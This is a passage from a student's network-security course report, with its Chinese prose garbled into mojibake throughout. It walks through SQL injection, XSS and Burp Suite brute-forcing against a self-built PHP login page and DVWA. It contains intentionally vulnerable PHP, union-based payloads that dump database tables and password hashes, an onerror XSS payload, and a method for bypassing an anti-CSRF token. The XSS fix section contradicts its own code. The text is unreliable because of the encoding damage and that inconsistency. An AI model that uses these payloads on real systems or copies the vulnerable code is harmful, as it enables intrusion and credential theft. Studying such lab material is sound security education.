                                         **<font size=6> ä¸­å›½çŸ¿ä¸šå¤§å­¦è®¡ç®—æœºå­¦é™¢ </font> **

â€‹                                            **<font size=6>2017 çº§æœ¬ç§‘ç”Ÿè¯¾ç¨‹æŠ¥å‘Š</font>**



â€‹                                                 è¯¾ç¨‹åç§°ï¼š        ç½‘ç»œå®‰å…¨

â€‹                                                 å­¦ç”Ÿå§“åï¼š        å¼ å¯…                

â€‹                                                 å­¦å·ï¼š              08173132

â€‹                                                 ä¸“ä¸šï¼š               ä¿¡æ¯å®‰å…¨

â€‹                                                 ä»»è¯¾æ•™å¸ˆï¼š        é²å®‡

â€‹                                                  æŠ¥å‘Šæ—¶é—´ï¼š       2019.12.1







------



[TOC]



------

# ä½œä¸šäºŒâ€”â€”ï¼ˆä¸€ï¼‰sqlæ³¨å…¥

## ä¸€ã€ç¯å¢ƒæ­å»º

### 1ã€å®‰è£…wampserver

wampserveråœ¨windowsä¸‹å°†Apache+PHP+Mysql é›†æˆ,ä¸€é”®æ“ä½œï¼Œæ¯”è¾ƒæ–¹ä¾¿

### 2ã€å®‰è£…åçš„å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜

å®‰è£…å®Œæˆåï¼Œæ‰“å¼€ï¼Œç”µè„‘å³ä¸‹è§’wampserverçš„å›¾æ ‡åº”è¯¥æ˜¯ç»¿è‰²çš„ï¼Œå¦‚æœæ˜¯çº¢è‰²å’Œæ©™è‰²ï¼Œé‚£å°±æ˜¯æœ‰äº›æœåŠ¡æ²¡æœ‰å¼€å¯ï¼Œåœ¨å›¾æ ‡ä¸Šå·¦é”®æŸ¥çœ‹æ˜¯å“ªä¸ªæœåŠ¡æ²¡æœ‰å¼€å¯ã€‚

![Qefo7R.png](https://s2.ax1x.com/2019/12/01/Qefo7R.png)

åœ¨å®‰è£…çš„æ—¶å€™å°±æ˜¯æ©™è‰²çš„ï¼ŒåŸå› æ˜¯ä¹‹å‰åšçš„è®¡ç½‘å®éªŒå¼€å¯äº†IISæœåŠ¡ï¼Œä¸apacheæœåŠ¡å†²çªäº†ï¼Œæ‰€ä»¥å…³æ‰IISæœåŠ¡å°±å¯ä»¥äº†ï¼Œå…·ä½“æ–¹æ³•ä¸ºï¼šè®¡ç®—æœºâ€”â€”æœ‰é”®â€”â€”ç®¡ç†â€”â€”æœåŠ¡ï¼Œæ‰¾åˆ°IISå…³é—­å³å¯ã€‚å¦‚æœä¹‹å‰çš„æ•°æ®åº“å®éªŒç”¨çš„ä¸æ˜¯MySQLï¼Œè€Œæ˜¯SQL severï¼Œåˆ™éœ€è¦å°†SQL serveræœåŠ¡ä¹Ÿå…³é—­ï¼Œæ–¹æ³•åŒä¸Šã€‚

### 3ã€ç¼–å†™ç™»å½•é¡µå’Œæµ‹è¯•é¡µ

å·¦é”®wampserverçš„å°å›¾æ ‡ï¼Œæ‰“å¼€wwwç›®å½•ï¼Œè¿›å…¥ï¼Œæ–°å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œlogin.php,test.phpã€‚ç¼–è¾‘ä¸¤ä¸ªæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š

login.php:

```php
<html>
<head>
<title>ç½‘ç»œå®‰å…¨ä½œä¸šäºŒ</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>
 <body >
<form action="test.php" method="post">
  <fieldset >
    <legend>è‡ªå»ºsqlæ³¨å…¥å¹³å°</legend>
    <table>
      <tr>
        <td>ç”¨æˆ·åï¼š</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>å¯†  ç ï¼š</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="æäº¤"></td>
        <td><input type="reset" value="é‡ç½®"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>
```

test.php:

```php
<?php
$pwd=$_POST['password'];
$uname=$_POST['username'];
//echo "æ‚¨å½“å‰æ‰§è¡Œçš„sqlè¯­å¥ä¸ºï¼š" ;
//echo "select * from admin where passward='$pwd' and name='$uname'<br/>";
//echo "<hr>";
$mysqli = new mysqli('127.0.0.1','root','','sqlin'); 
if(mysqli_connect_errno()){
    printf("è¿æ¥å¤±è´¥:%s<br>",mysqli_connect_error());
    exit();
}
$result = $mysqli->query("select * from admin where name='$uname'");
//print_r($result->fetch_array(MYSQLI_ASSOC));
if($row=mysqli_fetch_row($result))
{
	printf ("%s : %s",$row[0],$row[1]);
       	echo "<br>";
	echo "successï¼";
}
else
{
	echo "è´¦å·æˆ–å¯†ç é”™è¯¯ï¼";
}
$mysqli->close();
$result->close();?>
```

ç„¶ååœ¨æµè§ˆå™¨ä¸Šè¾“å…¥http://localhost/login.phpï¼Œå³å¯è¿›å…¥ç™»é™†é¡µé¢ã€‚

ä¸è¿‡ç›®å‰è¿˜æ²¡æœ‰æ•°æ®åº“ä¿¡æ¯ï¼Œåœ¨wampserverå°å›¾æ ‡å·¦é”®æ‰“å¼€mysql,è¿›å…¥ï¼Œé»˜è®¤æ— å¯†ç ï¼Œå»ºç«‹åä¸ºsqlinçš„æ•°æ®åº“ï¼Œå’Œåä¸ºadminçš„è¡¨

![Qefs7n.png](https://s2.ax1x.com/2019/12/01/Qefs7n.png)

![QeffcF.png](https://s2.ax1x.com/2019/12/01/QeffcF.png)

è¿™æ ·ç¯å¢ƒå°±æ­å¥½äº†ï¼Œå¯ä»¥å¼€å§‹æ³¨å…¥äº†ã€‚

## äºŒã€ç®€å•æ³¨å…¥

### åˆ¤æ–­æœ‰å‡ ä¸ªæ˜¾ç¤ºä½ã€‚

è¾“å…¥å¦‚ä¸‹:

```bash
ç”¨æˆ·åï¼š1' union select 1,2,3#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

å‘ç°æŠ¥é”™ï¼Œæ˜¾ç¤ºä½ä¸æ˜¯3ï¼Œé‡è¯•

```bash
ç”¨æˆ·åï¼š1' union select 1,2#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![QefHtx.png](https://s2.ax1x.com/2019/12/01/QefHtx.png)

æ˜¾ç¤ºä½ä¸ºä¸¤ä½

### ç¡®å®šè¡¨æœ‰å‡ åˆ—

```bash
ç”¨æˆ·åï¼š1' order by 3#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

æŠ¥é”™ï¼Œä¸æ˜¯3åˆ—

```bash
ç”¨æˆ·åï¼š1' order by 2#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![QefXcD.png](https://s2.ax1x.com/2019/12/01/QefXcD.png)

è¡¨æœ‰2åˆ—

### è·å–æ•°æ®åº“å

```bash
ç”¨æˆ·åï¼š1' union select 1,database() #
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![Qeh9AI.png](https://s2.ax1x.com/2019/12/01/Qeh9AI.png)

æ•°æ®åº“åä¸ºsqlin

### è·å–è¡¨å

```bash
ç”¨æˆ·åï¼š1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![QehF9f.png](https://s2.ax1x.com/2019/12/01/QehF9f.png)

è¡¨åä¸ºadmin

### è·å–åˆ—å

```bash
ç”¨æˆ·åï¼š0' union select (select column_name from information_schema.columns where table_name='admin' limit 0,1),(select column_name from information_schema.columns where table_name='admin' limit 1,2)#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![QeheBj.png](https://s2.ax1x.com/2019/12/01/QeheBj.png)

åˆ—åä¸ºname,passward

### è·å–æ•°æ®

```bash
ç”¨æˆ·åï¼š1' union select name,passward from admin#
å¯†ç ï¼š111ï¼ˆä»»æ„ï¼‰
```

![QehKNq.png](https://s2.ax1x.com/2019/12/01/QehKNq.png)

å¾—åˆ°ç”¨æˆ·ååŠå¯†ç 

ï¼ˆå»ºè¡¨çš„æ—¶å€™æŠŠpasswordæ‹¼é”™äº†ï¼‰ğŸ˜‚

## ä¸‰ã€æ³¨å…¥æ¼æ´ä¿®è¡¥

ç”±äºselectè¯­å¥å¹¶æ²¡æœ‰å¯¹è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œæ£€æµ‹ï¼Œè€Œæ˜¯æ‹¿æ¥ç›´æ¥ç”¨ï¼Œé€ æˆçš„æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥å¯¹è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œé•¿åº¦é™åˆ¶ï¼Œæˆ–è€…è¿‡æ»¤ã€‚

# ä½œä¸šäºŒâ€”â€”ï¼ˆäºŒï¼‰xssæ”»å‡»

## ä¸€ã€å»ºç«‹æ¼æ´é¡µé¢

åœ¨wwwç›®å½•ä¸‹æ–°å»ºxss.php,ä»£ç å¦‚ä¸‹

```php
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<title>xssæ¼æ´ç®€å•æ­å»º</title>
	</head>
	<body>
		<center>
			<h6>æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¾“å‡ºåˆ°inputé‡Œçš„valueå±æ€§é‡Œ</h6>
			<form action="" method="get">
				<h6>è¯·è¾“å…¥ä½ æƒ³æ˜¾ç°çš„å­—ç¬¦ä¸²</h6>
				<input type="text" name="xss_input_value" value="è¾“å…¥"><br />
				<input type='submit'>
			</form>
			<hr>
	
			<?php
			//phpé˜²æ³¨å…¥å’ŒXSSæ”»å‡»é€šç”¨è¿‡æ»¤
$_GET     && SafeFilter($_GET);
$_POST    && SafeFilter($_POST);
$_COOKIE  && SafeFilter($_COOKIE);
  
function SafeFilter (&$arr) 
{
   $ra=Array('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/'
   ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/'
   ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/',
   '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/'
   ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/');
     
   if (is_array($arr))
   {
     foreach ($arr as $key => $value) 
     {
        if (!is_array($value))
        {
          if (!get_magic_quotes_gpc())  //ä¸å¯¹magic_quotes_gpcè½¬ä¹‰è¿‡çš„å­—ç¬¦ä½¿ç”¨addslashes(),é¿å…åŒé‡è½¬ä¹‰ã€‚
          {
             $value  = addslashes($value); //ç»™å•å¼•å·ï¼ˆ'ï¼‰ã€åŒå¼•å·ï¼ˆ"ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰
          }
          $value       = preg_replace($ra,'',$value);     //åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸²
          $arr[$key]     = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“
        }
        else
        {
          SafeFilter($arr[$key]);
        }
     }
   }
}

			if (isset($_GET['xss_input_value']))
			{
				$s=$_GET['xss_input_value'];
				echo'<input type="text" value="'.$_GET['xss_input_value'].'">';
				
				
			}
			else{
				echo '<input type="text" value="è¾“å‡º">';
			}
			
?>

		</center>
		
		</script>
		

	</body>
</html>
```

åœ¨æµè§ˆå™¨è¾“å…¥http://localhost/xss.php/

è¿›å…¥é¡µé¢

![QehJu4.png](https://s2.ax1x.com/2019/12/01/QehJu4.png)

è¾“å…¥

```bash
"><img src=1 onerror=alert(/xss/)>
```

![Qeh6DH.png](https://s2.ax1x.com/2019/12/01/Qeh6DH.png)

æ”»å‡»æˆåŠŸ

## äºŒã€æ¼æ´ä¿®è¡¥

å°†xss.phpä¸­

```bash
//$_GET     && SafeFilter($_GET);
```

æ³¨é‡Šå»æ‰

```bash
$_GET     && SafeFilter($_GET);
```

é€šè¿‡SafeFilter()å‡½æ•°æ¥è¿‡æ»¤è¾“å…¥çš„å†…å®¹

å†è¾“å…¥åˆšæ‰çš„å†…å®¹

![QehW5t.png](https://s2.ax1x.com/2019/12/01/QehW5t.png)

# DVWAâ€”â€”Brute Force

## çº§åˆ«ï¼šlow

å…ˆè¿›å…¥DVWAé¡µé¢ï¼Œå®‰å…¨ç­‰çº§è®¾ç½®ä½low,å†è¿›å…¥æš´åŠ›ç ´è§£çš„é¡µé¢

![QehqVs.png](https://s2.ax1x.com/2019/12/01/QehqVs.png)

è¾“å…¥ç”¨æˆ·å

```bash
admin
```

å¯†ç 

```bash
123
```

å¼€å¯burp suiteæ‹¦æˆªï¼Œç™»é™†

![Qehx2T.png](https://s2.ax1x.com/2019/12/01/Qehx2T.png)

é€‰ä¸­å…¨éƒ¨å†…å®¹ï¼Œå³é”®å‘é€ç»™intruder

![Qe4VG6.png](https://s2.ax1x.com/2019/12/01/Qe4VG6.png)

ç‚¹clearæ¸…é™¤å…¨éƒ¨å˜é‡ï¼Œé€‰ä¸­123ï¼Œç‚¹addï¼Œæ·»åŠ å˜é‡

![Qe4ldA.png](https://s2.ax1x.com/2019/12/01/Qe4ldA.png)

åœ¨payloadsé‡Œæ·»åŠ ç ´è§£å­—å…¸

![Qe4GJP.png](https://s2.ax1x.com/2019/12/01/Qe4GJP.png)

ä¸‹é¢å°±å¯ä»¥æ”»å‡»äº†

burp suiteçš„æ”»å‡»ç±»å‹

![Qe4sJ0.png](https://s2.ax1x.com/2019/12/01/Qe4sJ0.png)

Sniperæ ‡ç­¾ è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚

äºŒã€æ”»å‡»

é€‰æ‹©sniperæ”»å‡»æ–¹å¼ï¼Œå¼€å§‹æ”»å‡»

æ ¹æ®æ”»å‡»ç»“æœçš„lengthæ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸ

![Qe4feJ.png](https://s2.ax1x.com/2019/12/01/Qe4feJ.png)

æ”»å‡»æˆåŠŸï¼Œå¯†ç ä¸ºpassword

## çº§åˆ«ï¼šmedium

Brute Force Source

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

mediumåŠ äº†é”™è¯¯å¯†ç å»¶è¿Ÿï¼Œlowçº§åˆ«çš„æ–¹æ³•è¿˜æ˜¯é€‚ç”¨ï¼Œå°±æ˜¯èŠ±è´¹æ—¶é—´æ›´é•¿

## çº§åˆ«ï¼šhigh

Brute Force Source

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```

åŠ äº† user_token ä¸€ä¸ªéšæœºå€¼ï¼Œæ¥é˜²æ­¢ç”¨æˆ·å¤šæ¬¡æäº¤

æŠ“åŒ…ï¼Œé€‰æ‹©Pitchforkæ”»å‡»ç±»å‹ï¼Œæ·»åŠ çˆ†ç ´çš„å‚æ•° ![Qm0Bb8.png](https://s2.ax1x.com/2019/12/01/Qm0Bb8.png)

optionsä¸­é€‰æ‹©å•çº¿ç¨‹

![Qm022n.png](https://s2.ax1x.com/2019/12/01/Qm022n.png)

 Optionsä¸­æ‰¾åˆ°Rediectionsæ¨¡å—ï¼Œé€‰æ‹©alwaysï¼Œå…è®¸é‡å®šå‘ 

![Qm0q2R.png](https://s2.ax1x.com/2019/12/01/Qm0q2R.png)

 åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractæ¨¡å—ï¼Œç‚¹å‡»Addï¼Œå¹¶è®¾ç½®ç­›é€‰æ¡ä»¶ï¼Œå¾—åˆ°user_token 

![QmB8s0.png](https://s2.ax1x.com/2019/12/01/QmB8s0.png)

 åœ¨Payloadsä¸­ä¸ºé€‰æ‹©çš„å‚æ•°è®¾ç½®å­—å…¸ 

![QmBtdU.png](https://s2.ax1x.com/2019/12/01/QmBtdU.png)

![QmBrsx.png](https://s2.ax1x.com/2019/12/01/QmBrsx.png)

å¼€å§‹æ”»å‡»

![QmBcdO.png](https://s2.ax1x.com/2019/12/01/QmBcdO.png)

lengthé•¿åº¦ä¸ä¸€æ ·ï¼Œå¯†ç æ˜¯password

# DVWAâ€”â€”SQL_Injection

## çº§åˆ«ï¼šlow

### æŸ¥çœ‹æºç 

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

### åˆ†æï¼š

ç”±ä»£ç å¯çŸ¥ï¼Œé€šè¿‡`REQUEST`æ–¹å¼æ¥å—ä¼ é€’çš„å‚æ•°idï¼Œå†é€šè¿‡sqlè¯­å¥å¸¦å…¥æŸ¥è¯¢ï¼Œå¹¶æœªè®¾ç½®ä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œsqlæ³¨å…¥åˆ©ç”¨ã€‚

### åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹

`è¾“å…¥1ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š`

![KgwPW6.png](https://s2.ax1x.com/2019/10/28/KgwPW6.png)

`è¾“å…¥1'and '1' ='2ï¼ŒæŸ¥è¯¢å¤±è´¥ï¼Œè¿”å›ç»“æœä¸ºç©ºï¼š`

![KgwRt1.png](https://s2.ax1x.com/2019/10/28/KgwRt1.png)

`è¾“å…¥1' or '1'='1 é¡µé¢æ­£å¸¸ï¼Œå¹¶è¿”å›æ›´å¤šä¿¡æ¯ï¼ŒæˆåŠŸæŸ¥è¯¢`

![Kg0wEd.png](https://s2.ax1x.com/2019/10/28/Kg0wEd.png)

**`åˆ¤æ–­å­˜åœ¨çš„æ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚`**

### çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°

`è¾“å…¥1' or 1=1 order by 1 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![KgDOhR.png](https://s2.ax1x.com/2019/10/28/KgDOhR.png)

`è¾“å…¥1' or 1=1 order by 2 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![KgrhUH.png](https://s2.ax1x.com/2019/10/28/KgrhUH.png)

`è¾“å…¥1' or 1=1 order by 3 #ï¼ŒæŸ¥è¯¢å¤±è´¥ï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![KgsUzt.png](https://s2.ax1x.com/2019/10/28/KgsUzt.png)

 `è¯´æ˜æ‰§è¡Œçš„SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚`

### ç¡®è®¤æ˜¾ç¤ºçš„å­—æ®µé¡ºåº

 `è¾“å…¥1' union select 1,2 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨ `

![MQK7Of.png](https://s2.ax1x.com/2019/11/11/MQK7Of.png)

 è¯´æ˜æ‰§è¡Œçš„SQLè¯­å¥ä¸ºselect First name,Surname from è¡¨ where ID=â€™idâ€™â€¦ 

### è·å–å½“å‰æ•°æ®åº“

 `è¾“å…¥1' union select 1,database() #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š#æ˜¯æ³¨é‡Šä½œç”¨ `

![MQMl7D.png](https://s2.ax1x.com/2019/11/11/MQMl7D.png)

 è¯´æ˜å½“å‰çš„æ•°æ®åº“ä¸ºdvwaã€‚ 

### è·å–æ•°æ®åº“ä¸­çš„è¡¨

`è¾“å…¥1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![MQM7C9.png](https://s2.ax1x.com/2019/11/11/MQM7C9.png)

 è¯´æ˜æ•°æ®åº“dvwaä¸­ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨ï¼Œguestbookä¸usersã€‚ 

### è·å–è¡¨ä¸­çš„å­—æ®µå

`è¾“å…¥1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![MQlbm6.png](https://s2.ax1x.com/2019/11/11/MQlbm6.png)

åœˆèµ·æ¥æ˜¯æ˜¯å­—æ®µå

### ä¸‹è½½æ•°æ®

`è¾“å…¥1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š #æ˜¯æ³¨é‡Šä½œç”¨`

![MQ1ncn.png](https://s2.ax1x.com/2019/11/11/MQ1ncn.png)

 è¿™æ ·å°±å¾—åˆ°äº†usersè¡¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„user_id,first_name,last_name,passwordçš„æ•°æ®ã€‚ 

## çº§åˆ«ï¼šmedium

### åˆ†æ

 Mediumçº§åˆ«çš„ä»£ç åˆ©ç”¨mysql_real_escape_stringå‡½æ•°å¯¹ç‰¹æ®Šç¬¦å·\x00,\n,\r,,â€™,â€,\x1aè¿›è¡Œè½¬ä¹‰ï¼ŒåŒæ—¶å‰ç«¯é¡µé¢è®¾ç½®äº†ä¸‹æ‹‰é€‰æ‹©è¡¨å•ï¼Œå¸Œæœ›ä»¥æ­¤æ¥æ§åˆ¶ç”¨æˆ·çš„è¾“å…¥ã€‚ 

![MlYjiV.png](https://s2.ax1x.com/2019/11/11/MlYjiV.png)

 è™½ç„¶å‰ç«¯ä½¿ç”¨äº†ä¸‹æ‹‰é€‰æ‹©èœå•ï¼Œä½†æˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡æŠ“åŒ…æ”¹å‚æ•°ï¼Œæäº¤æ¶æ„æ„é€ çš„æŸ¥è¯¢å‚æ•°ã€‚ 

###  åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ 

 `æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1' or 1=1 # æŠ¥é”™ï¼š #æ˜¯æ³¨é‡Šä½œç”¨ `

![MlNW38.png](https://s2.ax1x.com/2019/11/11/MlNW38.png)

![MlNhjg.png](https://s2.ax1x.com/2019/11/11/MlNhjg.png)

![MlNIBj.png](https://s2.ax1x.com/2019/11/11/MlNIBj.png)

 `æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 or 1=1 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š` 

![MlUAgO.png](https://s2.ax1x.com/2019/11/11/MlUAgO.png)

![MlUEvD.png](https://s2.ax1x.com/2019/11/11/MlUEvD.png)

 `è¯´æ˜å­˜åœ¨æ•°å­—å‹æ³¨å…¥ã€‚ `

 ç”±äºæ˜¯æ•°å­—å‹æ³¨å…¥ï¼ŒæœåŠ¡å™¨ç«¯çš„mysql_real_escape_stringå‡½æ•°å°±å½¢åŒè™šè®¾äº†ï¼Œå› ä¸ºæ•°å­—å‹æ³¨å…¥å¹¶ä¸éœ€è¦å€ŸåŠ©å¼•å·ã€‚ 

###  çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•° 

` æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 order by 2 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š `

![MlwIzV.png](https://s2.ax1x.com/2019/11/11/MlwIzV.png)

` æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 order by 3 #ï¼ŒæŠ¥é”™ï¼š `

![MlwLdJ.png](https://s2.ax1x.com/2019/11/11/MlwLdJ.png)

` è¯´æ˜æ‰§è¡Œçš„SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚ `

###  ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº 

 `æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 union select 1,2 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š `

![Ml0JWq.png](https://s2.ax1x.com/2019/11/11/Ml0JWq.png)

 è¯´æ˜æ‰§è¡Œçš„SQLè¯­å¥ä¸ºselect First name,Surname from è¡¨ where ID=idâ€¦ 

###  è·å–å½“å‰æ•°æ®åº“

 `æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 union select 1,database() #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š `

![Ml0j0g.png](https://s2.ax1x.com/2019/11/11/Ml0j0g.png)

` è¯´æ˜å½“å‰çš„æ•°æ®åº“ä¸ºdvwaã€‚ `

